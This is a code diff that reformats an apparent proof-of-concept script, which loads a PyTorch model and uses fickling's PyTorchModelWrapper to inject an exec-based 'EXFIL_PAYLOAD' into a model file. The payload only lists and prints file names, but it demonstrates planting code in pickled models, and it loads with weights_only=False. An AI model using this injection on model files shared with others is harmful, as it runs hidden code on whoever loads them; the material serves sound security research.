@@ -36,8 +36,6 @@ class TheModelClass(nn.Module):
         return x
 
 
-
-
 if __name__ == "__main__":
     import sys
 
@@ -52,14 +50,12 @@ if __name__ == "__main__":
     model = torch.load("pytorch_standard_model.zip", weights_only=False)
     model.eval()
 
-    EXFIL_PAYLOAD = "exec(\"import os\\nfor file in os.listdir():\\n    print(f'Exfiltrating {file}')\")"
+    EXFIL_PAYLOAD = (
+        "exec(\"import os\\nfor file in os.listdir():\\n    print(f'Exfiltrating {file}')\")"
+    )
 
     # Use the PyTorchModelWrapper from fickling.pytorch to inject payload
-    wrapper.inject_payload(
-        EXFIL_PAYLOAD,
-        Path("pytorch_exfil_poc.zip"),
-        injection="insertion"
-    )
+    wrapper.inject_payload(EXFIL_PAYLOAD, Path("pytorch_exfil_poc.zip"), injection="insertion")
     exfil_model = PyTorchModelWrapper(Path("pytorch_exfil_poc.zip"))
     print(f"Created PyTorch exfiltration exploit payload PoC {exfil_model.path.absolute()!s}")
 
